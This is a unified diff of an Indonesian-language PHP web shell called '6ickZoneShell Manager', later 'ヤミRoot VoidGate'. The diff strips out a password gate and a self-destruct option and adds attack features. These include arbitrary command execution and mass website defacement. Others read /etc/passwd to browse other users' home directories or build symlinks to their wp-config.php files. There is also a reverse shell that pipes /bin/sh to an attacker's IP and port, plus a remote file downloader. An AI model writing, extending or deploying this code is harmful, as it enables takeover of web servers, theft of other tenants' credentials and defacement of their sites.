@@ -1,66 +1,11 @@
 <?php
-// ==================================================================
-// GHOST MODE V2.0 - PASSWORD PROTECTION LAYER
-// ==================================================================
-session_start();
-$password = '6ickZone1337'; // GANTI DENGAN PASSWORD SUPER RAHASIAMU!
-$cookie_name = 'ghost_session_id_'.md5(__FILE__);
-
-// Logout
-if (isset($_GET['logout'])) {
-    setcookie($cookie_name, '', time() - 3600, "/");
-    header('Location: ' . basename(__FILE__));
-    exit();
-}
-
-// Cek login via POST atau COOKIE
-$is_logged_in = false;
-if (isset($_COOKIE[$cookie_name]) && $_COOKIE[$cookie_name] === md5($password)) {
-    $is_logged_in = true;
-} elseif (isset($_POST['password']) && $_POST['password'] === $password) {
-    setcookie($cookie_name, md5($password), time() + (86400 * 1), "/"); // Cookie berlaku 1 hari
-    $is_logged_in = true;
-}
-
-// Jika tidak login, tampilkan halaman login dan hentikan script.
-if (!$is_logged_in) {
-    $theme_bg = "#000000";
-    $theme_fg = "#00FFFF";
-    $theme_border_color = "#00FFFF";
-    ?>
-    <!DOCTYPE HTML>
-    <html>
-    <head>
-        <title>Authentication Required</title>
-        <link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css">
-        <style>
-            body { background-color: <?php echo $theme_bg; ?>; color: <?php echo $theme_fg; ?>; font-family: 'Kelly Slab', cursive; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-            .login-box { background-color: #1a1a1a; border: 1px solid <?php echo $theme_border_color; ?>; padding: 30px; border-radius: 8px; text-align: center; box-shadow: 0 0 20px rgba(0, 255, 255, 0.2); }
-            h3 { color: #fff; }
-            input[type="password"] { background: #000; color: <?php echo $theme_fg; ?>; border: 1px solid <?php echo $theme_border_color; ?>; padding: 10px; border-radius: 5px; width: 200px; }
-            input[type="submit"] { background: <?php echo $theme_fg; ?>; color: <?php echo $theme_bg; ?>; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; margin-top: 15px; }
-        </style>
-    </head>
-    <body>
-        <div class="login-box">
-            <h3><i class="fa fa-lock"></i> Authentication Required</h3>
-            <form method="POST" action="">
-                <input type="password" name="password" autofocus>
-                <br>
-                <input type="submit" value="Login">
-            </form>
-        </div>
-    </body>
-    </html>
-    <?php
-    exit(); // Penting: Hentikan eksekusi script di sini.
-}
-
-// ==================================================================
-// MAIN SHELL CODE STARTS HERE (Only runs if logged in)
-// ==================================================================
-
+/**
+ * 6ickZoneShell Manager by 0x6ick x Nyx6st | Copyright 2025 by 6ickwhispers@gmail.com
+ * --- RE-ORGANIZED MENU VERSION by Nyx6st ---
+ * All features integrated, with new menu layout and network tools.
+ **/
 error_reporting(0);
+session_start();
 @ini_set('output_buffering', 0);
 @ini_set('display_errors', 0);
 ini_set('memory_limit', '256M');
@@ -68,21 +13,21 @@ header('Content-Type: text/html; charset=UTF-8');
 ob_end_clean();
 
 // --- CONFIG ---
-$title = "6ickZoneShell Manager";
+$title = "ヤミRoot VoidGate";
 $author = "0x6ick";
-$theme_bg = "#000000";
-$theme_fg = "#00FFFF";
-$theme_highlight = "#00FFD1";
-$theme_link = "#00FFFF";
-$theme_link_hover = "#FFFFFF";
-$theme_border_color = "#00FFFF";
-$theme_table_header_bg = "#191919";
-$theme_table_row_hover = "#333333";
-$theme_input_bg = "black";
-$theme_input_fg = "#00FFFF";
-$font_family = "'Kelly Slab', cursive";
-$message_success_color = "#00CCFF";
-$message_error_color = "red";
+$theme_bg = "#0a0a0f"; // Dark violet-black cyber base
+$theme_fg = "#E0FF00"; // Neon yellow text
+$theme_highlight = "#FF00C8"; // Pink cyber glow
+$theme_link = "#00FFF7"; // Electric cyan
+$theme_link_hover = "#FF00A0"; // Pink on hover
+$theme_border_color = "#7D00FF"; // Neon purple border
+$theme_table_header_bg = "#1a0025"; // Dark purple-ish header
+$theme_table_row_hover = "#330033"; // Deep glitch violet
+$theme_input_bg = "#120024"; // Dark form input bg
+$theme_input_fg = "#00FFB2"; // Neon greenish-cyan input text
+$font_family = "'Orbitron', sans-serif"; // Futuristic mecha font
+$message_success_color = "#39FF14"; // Bright lime green
+$message_error_color = "#FF0033"; // Neon blood red
 
 // --- FUNCTIONS ---
 function sanitizeFilename($filename) { return basename($filename); }
@@ -111,7 +56,7 @@ if(isset($_POST['curl_download'])) { $url = $_POST['url']; $filename = sanitizeF
 <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"/>
 <title><?php echo htmlspecialchars($title); ?></title>
 <style>
-body{font-family:'Kelly Slab',cursive;background-color:<?php echo $theme_bg;?>;color:<?php echo $theme_fg;?>;margin:0;padding:0;} a{font-size:1em;color:<?php echo $theme_link;?>;text-decoration:none;} a:hover{color:<?php echo $theme_link_hover;?>;} table{border-collapse:collapse;width:95%;max-width:1200px;margin:15px auto;} .td_home{border:2px solid <?php echo $theme_table_row_hover;?>;padding:7px;vertical-align:middle;} #content tr:hover{background-color:<?php echo $theme_table_row_hover;?>;} #content .first{background-color:<?php echo $theme_table_header_bg;?>;font-weight:bold;padding:10px;} input,select,textarea{border:1px solid <?php echo $theme_link_hover;?>;border-radius:5px;background:<?php echo $theme_input_bg;?>;color:<?php echo $theme_input_fg;?>;font-family:'Kelly Slab',cursive;padding:5px;box-sizing:border-box;} input[type="submit"]{background:<?php echo $theme_input_bg;?>;color:<?php echo $theme_fg;?>;border:2px solid <?php echo $theme_fg;?>;cursor:pointer;font-weight:bold;} input[type="submit"]:hover{background:<?php echo $theme_fg;?>;color:<?php echo $theme_input_bg;?>;} h1,h3{font-family:'Kelly Slab';text-align:center;} h1{font-size:35px;color:white;margin:20px 0 10px;} h3{color:<?php echo $theme_highlight;?>} .path-nav{margin:10px auto;width:95%;max-width:1200px;text-align:left;word-wrap:break-word;} .message{padding:10px;margin:10px auto;border-radius:5px;width:95%;max-width:1200px;font-weight:bold;text-align:center;} .message.success{background-color:<?php echo $message_success_color;?>;color:<?php echo $theme_bg;?>;} .message.error{background-color:<?php echo $message_error_color;?>;color:white;} .section-box{background-color:#1a1a1a;border:1px solid <?php echo $theme_border_color;?>;padding:15px;margin:20px auto;border-radius:8px;width:95%;max-width:1200px;} .main-menu{margin:20px auto;width:95%;max-width:1200px;text-align:center;padding:10px 0;border-top:1px solid <?php echo $theme_border_color;?>;border-bottom:1px solid <?php echo $theme_border_color;?>;} .main-menu div { margin-bottom: 8px; } .main-menu a{margin:0 8px;font-size:1.1em;white-space:nowrap;} pre{background-color:#0e0e0e;border:1px solid #444;padding:10px;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word;color:#00FFD1;} code{background:#333;color:#FFB800;padding:2px 5px;border-radius:3px;} details summary {cursor:pointer; background:#222; padding:5px; border-radius:3px; margin-bottom: 5px;}
+body{font-family:'Orbitron',sans-serif;background-color:<?php echo $theme_bg;?>;color:<?php echo $theme_fg;?>;margin:0;padding:0;} a{font-size:1em;color:<?php echo $theme_link;?>;text-decoration:none;} a:hover{color:<?php echo $theme_link_hover;?>;} table{border-collapse:collapse;width:95%;max-width:1200px;margin:15px auto;} .td_home{border:2px solid <?php echo $theme_table_row_hover;?>;padding:7px;vertical-align:middle;} #content tr:hover{background-color:<?php echo $theme_table_row_hover;?>;} #content .first{background-color:<?php echo $theme_table_header_bg;?>;font-weight:bold;padding:10px;} input,select,textarea{border:1px solid <?php echo $theme_link_hover;?>;border-radius:5px;background:<?php echo $theme_input_bg;?>;color:<?php echo $theme_input_fg;?>;font-family:'Kelly Slab',cursive;padding:5px;box-sizing:border-box;} input[type="submit"]{background:<?php echo $theme_input_bg;?>;color:<?php echo $theme_fg;?>;border:2px solid <?php echo $theme_fg;?>;cursor:pointer;font-weight:bold;} input[type="submit"]:hover{background:<?php echo $theme_fg;?>;color:<?php echo $theme_input_bg;?>;} h1,h3{font-family:'Kelly Slab';text-align:center;} h1{font-size:35px;color:white;margin:20px 0 10px;} h3{color:<?php echo $theme_highlight;?>} .path-nav{margin:10px auto;width:95%;max-width:1200px;text-align:left;word-wrap:break-word;} .message{padding:10px;margin:10px auto;border-radius:5px;width:95%;max-width:1200px;font-weight:bold;text-align:center;} .message.success{background-color:<?php echo $message_success_color;?>;color:<?php echo $theme_bg;?>;} .message.error{background-color:<?php echo $message_error_color;?>;color:white;} .section-box{background-color:#1a1a1a;border:1px solid <?php echo $theme_border_color;?>;padding:15px;margin:20px auto;border-radius:8px;width:95%;max-width:1200px;} .main-menu{margin:20px auto;width:95%;max-width:1200px;text-align:center;padding:10px 0;border-top:1px solid <?php echo $theme_border_color;?>;border-bottom:1px solid <?php echo $theme_border_color;?>;} .main-menu div { margin-bottom: 5px; } .main-menu a{margin:0 8px;font-size:1.1em;white-space:nowrap;} pre{background-color:#0e0e0e;border:1px solid #444;padding:10px;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word;color:#00FFD1;} code{background:#333;color:#FFB800;padding:2px 5px;border-radius:3px;} details summary {cursor:pointer; background:#222; padding:5px; border-radius:3px; margin-bottom: 5px;}
 </style>
 </head>
 <body>
@@ -140,11 +85,6 @@ if(isset($_SESSION['feature_output'])) { echo '<div class="section-box"><h3>Hasi
         <a href="?path=<?php echo urlencode($path); ?>&action=header">Header</a> |
         <a href="?path=<?php echo urlencode($path); ?>&action=curl">cURL</a>
     </div>
-    <div style="margin-top: 10px; border-top: 1px dashed #555; padding-top: 10px;">
-        <a href="?action=about">About</a> |
-        <a href="?action=self_delete" style="color: red; font-weight: bold;"><i class="fa fa-fire"></i> SELF DESTRUCT <i class="fa fa-fire"></i></a> |
-        <a href="?logout=true" style="color: yellow;">Logout</a>
-    </div>
 </div>
 <div class="path-nav">
     <i class="fa fa-folder-o"></i> :
@@ -165,17 +105,29 @@ if (isset($_GET['action'])) {
     $show_file_list = false;
     echo '<div class="section-box">';
     switch ($_GET['action']) {
-        case 'about': echo '<h3>About This Shell</h3><pre>
-  _____   _  _   _    __   ____  _____   _   _   _____   _       _  _
- / ____| | || | | |  / /  / __ \|  __ \ | \ | | |  __ \ | |     | || |
-| (___   | || | | | / /  | |  | | |__) ||  \| | | |__) || |     | || |
- \___ \  | || | | |< <   | |  | |  _  / | . ` | |  ___/ | |     | || |
- ____) | | || | | | \ \  | |__| | | \ \ | |\  | | |     | |____ | || |
-|_____/  |_||_| |_|  \_\  \____/|_|  \_\|_| \_| |_|     |______||_||_|
-</pre><p style="text-align:center;">A powerful, feature-rich shell developed by <strong>'.htmlspecialchars($author).'</strong> with the assistance of Gemini.</p><p style="text-align:center;">This toolkit is designed for educational and authorized security testing purposes only.</p>'; break;
-        case 'self_delete': echo '<h3><i class="fa fa-fire" style="color:red;"></i> Self Destruct Sequence</h3>'; if (isset($_POST['confirm_self_delete']) && isset($_POST['confirmation_text'])) { if ($_POST['confirmation_text'] === 'HAPUS') { $main_script_name = basename(__FILE__); $cleaner_script_name = 'cleaner_' . uniqid() . '.php'; $cleaner_code = "<?php @unlink('{$main_script_name}'); echo '<body style=\"background:black; color:lime; font-family:monospace; text-align:center; padding-top: 20%;\"><h1>Goodbye.</h1><p>Main script [{$main_script_name}] has been deleted.</p><p>This cleaner will now self-destruct.</p></body>'; @unlink(__FILE__); ?>"; if (file_put_contents($cleaner_script_name, $cleaner_code)) { header("Location: {$cleaner_script_name}"); exit(); } else { echo '<p style="color:red;"><strong>GAGAL!</strong> Tidak bisa membuat agen pembersih. Cek izin tulis direktori.</p>'; } } else { echo '<p style="color:yellow;">Teks konfirmasi salah. Penghapusan dibatalkan.</p>'; } } echo '<p style="color:yellow; text-align:center; font-size:1.2em;"><strong>PERINGATAN TINGKAT AKHIR!</strong></p>'; echo '<p style="text-align:center;">Anda akan menghapus file shell ini secara permanen dari server.<br>Tindakan ini <strong>TIDAK BISA DIBATALKAN</strong>.</p>'; echo '<p style="text-align:center; margin-top:20px;">Untuk melanjutkan, ketik kata <strong>HAPUS</strong> di dalam kotak di bawah ini:</p>'; echo '<form method="POST" action="?action=self_delete" style="text-align:center; margin-top:10px;"><input type="text" id="confirmation_input" name="confirmation_text" autocomplete="off" style="width: 200px; text-align:center; text-transform:uppercase;"><br><br><input type="submit" id="delete_button" name="confirm_self_delete" value="HAPUS PERMANEN SEKARANG" style="background:grey; color:white; height:40px; font-size:1.1em;" disabled></form>'; echo '<script>const confirmInput = document.getElementById("confirmation_input"); const deleteButton = document.getElementById("delete_button"); const requiredText = "HAPUS"; confirmInput.addEventListener("input", function() { if (confirmInput.value.toUpperCase() === requiredText) { deleteButton.disabled = false; deleteButton.style.background = "red"; deleteButton.style.cursor = "pointer"; } else { deleteButton.disabled = true; deleteButton.style.background = "grey"; deleteButton.style.cursor = "not-allowed"; } }); </script>'; echo '<p style="text-align:center; margin-top:20px;"><a href="?path='.urlencode($path).'">Tidak, Batal! Kembali ke File Manager</a></p>'; break;
-        // Other cases from previous version...
-        default: echo '<h3>Fitur Tidak Dikenal</h3>'; break;
+        // --- BASIC ACTIONS ---
+        case 'cmd': $cmd_output = (isset($_POST['do_cmd'])) ? htmlspecialchars(exe($_POST['cmd_input'])) : ''; echo '<h3>Execute Command</h3><form method="POST" action="?action=cmd&path='.urlencode($path).'"><input type="text" name="cmd_input" placeholder="whoami" style="width: calc(100% - 80px);" autofocus><input type="submit" name="do_cmd" value=">>" style="width: 70px;"></form>'; if($cmd_output) echo '<h4>Output:</h4><pre>'.$cmd_output.'</pre>'; break;
+        case 'upload_form': echo '<h3>Upload File</h3><form enctype="multipart/form-data" method="POST" action="?path='.urlencode($path).'"><input type="file" name="file_upload" required/><input type="submit" value="UPLOAD" style="margin-left:10px;"/></form>'; break;
+        case 'create_form': echo '<h3>Create New</h3><form method="POST" action="?create_new=true&path='.urlencode($path).'"><select name="create_type"><option value="file">File</option><option value="dir">Folder</option></select> <input type="text" name="create_name" required placeholder="Nama file/folder"> <input type="submit" value="Create"></form>'; break;
+        // --- HACKING TOOLS ---
+        case 'mass_deface_form': echo '<h3>Mass Deface</h3><form method="post" action="?path='.urlencode($path).'"><p>Tipe:<br><input type="radio" name="tipe_sabun" value="murah" checked>Biasa (1 level) | <input type="radio" name="tipe_sabun" value="mahal">Massal (Rekursif)</p><p>Folder Target:<br><input type="text" name="d_dir" value="'.htmlspecialchars($path).'" style="width:100%"></p><p>Nama File:<br><input type="text" name="d_file" value="index.html" style="width:100%"></p><p>Isi Script:<br><textarea name="script_content" style="width:100%;height:150px">Hacked By 0x6ick</textarea></p><input type="submit" name="start_mass_deface" value="GAS!" style="width:100%"></form>'; break;
+        case 'jumping': echo '<h3><i class="fa fa-users"></i> Jumping (User Scanner)</h3><p>Membaca <code>/etc/passwd</code> untuk menemukan semua user di server dan memeriksa akses direktori home.</p>'; if (is_readable('/etc/passwd')) { preg_match_all('/(^[a-zA-Z0-9\._-]+):x:/m', file_get_contents('/etc/passwd'), $matches); if(!empty($matches[1])){ echo '<table><tr class="first"><th>Username</th><th>Home Directory</th><th>Status</th><th>Aksi</th></tr>'; foreach ($matches[1] as $user) { $home_dir = '/home/' . $user; if (is_readable($home_dir)) { $status = '<font color="lime">Bisa Dibaca</font>'; $action = '<a href="?path='.urlencode($home_dir).'">Jelajahi</a>'; } else { $status = '<font color="red">Tidak Bisa Dibaca</font>'; $action = '-'; } echo '<tr><td class="td_home">'.htmlspecialchars($user).'</td><td class="td_home">'.htmlspecialchars($home_dir).'</td><td class="td_home">'.$status.'</td><td class="td_home">'.$action.'</td></tr>'; } echo '</table>'; } } else { echo '<p style="color:red;"><strong>Gagal:</strong> File <code>/etc/passwd</code> tidak bisa dibaca.</p>'; } break;
+        case 'symlink': echo '<h3><i class="fa fa-link"></i> Symlink Creator</h3>'; if (!function_exists('symlink')) { echo '<p style="color:red;"><strong>Gagal:</strong> Fungsi <code>symlink()</code> dinonaktifkan di server ini.</p>'; } else { if (isset($_POST['create_symlink'])) { if (symlink($_POST['target_file'], $path . DIRECTORY_SEPARATOR . sanitizeFilename($_POST['link_name']))) { echo '<p style="color:lime;"><strong>Sukses!</strong> Symlink dibuat. Akses di: <a href="'.htmlspecialchars(sanitizeFilename($_POST['link_name'])).'" target="_blank">'.htmlspecialchars($path . DIRECTORY_SEPARATOR . sanitizeFilename($_POST['link_name'])).'</a></p>'; } else { echo '<p style="color:red;"><strong>Gagal!</strong> Tidak bisa membuat symlink.</p>'; } } echo '<form method="POST" action="?action=symlink&path='.urlencode($path).'"><p>Target File (Full Path):<br><input type="text" name="target_file" style="width:100%" placeholder="/home/userlain/public_html/wp-config.php"></p><p>Nama Link (di direktori ini):<br><input type="text" name="link_name" style="width:100%" placeholder="config_lain.txt"></p><input type="submit" name="create_symlink" value="Buat Symlink"></form>'; } break;
+        case 'reverse_shell': echo '<h3><i class="fa fa-terminal"></i> Reverse Shell</h3>'; if (!function_exists('fsockopen') || !function_exists('proc_open')) { echo '<p style="color:red;"><strong>Gagal:</strong> Fungsi <code>fsockopen()</code> atau <code>proc_open()</code> dinonaktifkan.</p>'; } else { $ip_attacker = isset($_POST['ip_attacker']) ? htmlspecialchars($_POST['ip_attacker']) : $_SERVER['REMOTE_ADDR']; $port_attacker = isset($_POST['port_attacker']) ? htmlspecialchars($_POST['port_attacker']) : '4444'; echo '<div style="background:#222;border:1px solid #444;padding:10px;margin-bottom:15px;border-radius:5px;"><h4><i class="fa fa-info-circle"></i> Cara Pakai:</h4><ol><li>Di terminalmu, jalankan listener: <code>nc -lvnp '.$port_attacker.'</code></li><li>Masukkan <strong>IP Publik</strong> komputermu di bawah.</li><li>Klik "GASKEUN!". Halaman browser ini mungkin akan terus loading (normal).</li><li>Cek terminalmu, shell server akan muncul jika berhasil.</li></ol></div>'; echo '<form method="POST" action="?action=reverse_shell&path='.urlencode($path).'"><label>IP Attacker: <input type="text" name="ip_attacker" value="'.$ip_attacker.'"></label> <label>Port: <input type="text" name="port_attacker" value="'.$port_attacker.'" size="5"></label> <input type="submit" name="start_reverse_shell" value="GASKEUN!"></form>'; if (isset($_POST['start_reverse_shell'])) { echo "<h4>Mencoba koneksi ke ".htmlspecialchars($_POST['ip_attacker']).":".htmlspecialchars($_POST['port_attacker'])." ...</h4>"; if(ob_get_level()) ob_end_flush(); flush(); set_time_limit(0); ignore_user_abort(true); $sock = @fsockopen($_POST['ip_attacker'], (int)$_POST['port_attacker'], $errno, $errstr, 30); if (!$sock) { echo '<p style="color:red;"><strong>Koneksi Gagal!</strong> Pastikan listener sudah berjalan.</p>'; } else { echo '<p style="color:lime;"><strong>Koneksi Berhasil!</strong> Cek terminalmu sekarang!</p>'; if(ob_get_level()) ob_end_flush(); flush(); $process = proc_open('/bin/sh -i', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); if (is_resource($process)) proc_close($process); } } } break;
+        // --- NETWORK TOOLS ---
+        case 'ping': $ping_output = (isset($_POST['do_ping'])) ? htmlspecialchars(exe("ping -c 4 ".escapeshellarg($_POST['target_host']))) : ''; echo '<h3>Ping</h3><form method="POST" action="?action=ping&path='.urlencode($path).'"><input type="text" name="target_host" placeholder="google.com" required><input type="submit" name="do_ping" value="Ping"></form>'; if($ping_output) echo '<h4>Output:</h4><pre>'.$ping_output.'</pre>'; break;
+        case 'portscan': $scan_output = (isset($_POST['do_scan'])) ? htmlspecialchars(exe("nmap -p ".escapeshellarg($_POST['ports'])." ".escapeshellarg($_POST['target_host']))) : ''; echo '<h3>Port Scan (nmap)</h3><form method="POST" action="?action=portscan&path='.urlencode($path).'"><p>Host: <input type="text" name="target_host" placeholder="scanme.nmap.org" required></p><p>Ports: <input type="text" name="ports" placeholder="21,22,80,443" required></p><input type="submit" name="do_scan" value="Scan"></form>'; if($scan_output) echo '<h4>Output:</h4><pre>'.$scan_output.'</pre>'; break;
+        case 'dnslookup': $dns_output = (isset($_POST['do_lookup'])) ? htmlspecialchars(exe("dig ".escapeshellarg($_POST['target_domain'])." ".escapeshellarg($_POST['record_type']))) : ''; echo '<h3>DNS Lookup (dig)</h3><form method="POST" action="?action=dnslookup&path='.urlencode($path).'"><p>Domain: <input type="text" name="target_domain" placeholder="google.com" required></p><p>Record Type: <select name="record_type"><option>A</option><option>MX</option><option>NS</option><option>TXT</option><option>ANY</option></select></p><input type="submit" name="do_lookup" value="Lookup"></form>'; if($dns_output) echo '<h4>Output:</h4><pre>'.$dns_output.'</pre>'; break;
+        case 'whois': $whois_output = (isset($_POST['do_whois'])) ? htmlspecialchars(exe("whois ".escapeshellarg($_POST['target_domain']))) : ''; echo '<h3>Whois Lookup</h3><form method="POST" action="?action=whois&path='.urlencode($path).'"><input type="text" name="target_domain" placeholder="google.com" required><input type="submit" name="do_whois" value="Whois"></form>'; if($whois_output) echo '<h4>Output:</h4><pre>'.$whois_output.'</pre>'; break;
+        case 'header': $header_output = ''; if (isset($_POST['get_header'])) { $url = $_POST['target_url']; if(filter_var($url, FILTER_VALIDATE_URL)) { $headers = get_headers($url, 1); $header_output = htmlspecialchars(print_r($headers, true)); } else { $header_output = 'URL tidak valid.'; } } echo '<h3>HTTP Header Viewer</h3><form method="POST" action="?action=header&path='.urlencode($path).'"><input type="text" name="target_url" placeholder="http://google.com" required style="width:calc(100% - 90px)"><input type="submit" name="get_header" value="Get Header"></form>'; if($header_output) echo '<h4>Output:</h4><pre>'.$header_output.'</pre>'; break;
+        case 'curl': echo '<h3>cURL Downloader</h3><form method="POST" action="?path='.urlencode($path).'"><p>URL File:<br><input type="text" name="url" placeholder="https://example.com/file.txt" required style="width:100%"></p><input type="submit" name="curl_download" value="Download ke Direktori Ini"></form>'; break;
+        // --- FILE MANAGER ACTIONS ---
+        case 'delete': echo '<h3>Konfirmasi Hapus: '.htmlspecialchars(basename($_GET['target_file'])).'</h3><p style="color:red;text-align:center;">Anda YAKIN? Tindakan ini tidak bisa dibatalkan.</p><form method="POST" action="?option=true&path='.urlencode($path).'"><input type="hidden" name="path_target" value="'.htmlspecialchars($_GET['target_file']).'"><input type="hidden" name="opt_action" value="delete"><input type="submit" value="YA, HAPUS" style="background:red;color:white;"/> <a href="?path='.urlencode($path).'" style="margin-left:10px;">BATAL</a></form>'; break;
+        case 'extract_form': echo '<h3>Konfirmasi Ekstrak: '.htmlspecialchars(basename($_GET['target_file'])).'</h3><p>Ekstrak semua isi file ini ke direktori saat ini ('.htmlspecialchars($path).')?</p><form method="POST" action="?option=true&path='.urlencode($path).'"><input type="hidden" name="path_target" value="'.htmlspecialchars($_GET['target_file']).'"><input type="hidden" name="opt_action" value="extract_save"><input type="submit" value="YA, EKSTRAK"/> <a href="?path='.urlencode($path).'" style="margin-left:10px;">BATAL</a></form>'; break;
+        case 'view_file': echo '<h3>Viewing: '.htmlspecialchars(basename($_GET['target_file'])).'</h3><textarea style="width:100%;height:400px;" readonly>'.htmlspecialchars(@file_get_contents($_GET['target_file'])).'</textarea>'; break;
+        case 'edit_form': echo '<h3>Editing: '.htmlspecialchars(basename($_GET['target_file'])).'</h3><form method="POST" action="?option=true&path='.urlencode($path).'"><textarea name="src_content" style="width:100%;height:400px;">'.htmlspecialchars(@file_get_contents($_GET['target_file'])).'</textarea><br><input type="hidden" name="path_target" value="'.htmlspecialchars($_GET['target_file']).'"><input type="hidden" name="opt_action" value="edit_save"><input type="submit" value="SAVE"/></form>'; break;
+        case 'rename_form': echo '<h3>Rename: '.htmlspecialchars(basename($_GET['target_file'])).'</h3><form method="POST" action="?option=true&path='.urlencode($path).'">New Name: <input name="new_name_value" type="text" value="'.htmlspecialchars(basename($_GET['target_file'])).'"/><input type="hidden" name="path_target" value="'.htmlspecialchars($_GET['target_file']).'"><input type="hidden" name="opt_action" value="rename_save"><input type="submit" value="RENAME"/></form>'; break;
+        case 'chmod_form': $current_perms = substr(sprintf('%o', @fileperms($_GET['target_file'])), -4); echo '<h3>Chmod: '.htmlspecialchars(basename($_GET['target_file'])).'</h3><form method="POST" action="?option=true&path='.urlencode($path).'">Permission: <input name="perm_value" type="text" size="4" value="'.$current_perms.'"/><input type="hidden" name="path_target" value="'.htmlspecialchars($_GET['target_file']).'"><input type="hidden" name="opt_action" value="chmod_save"><input type="submit" value="CHMOD"/></form>'; break;
     }
     echo '</div>';
 }
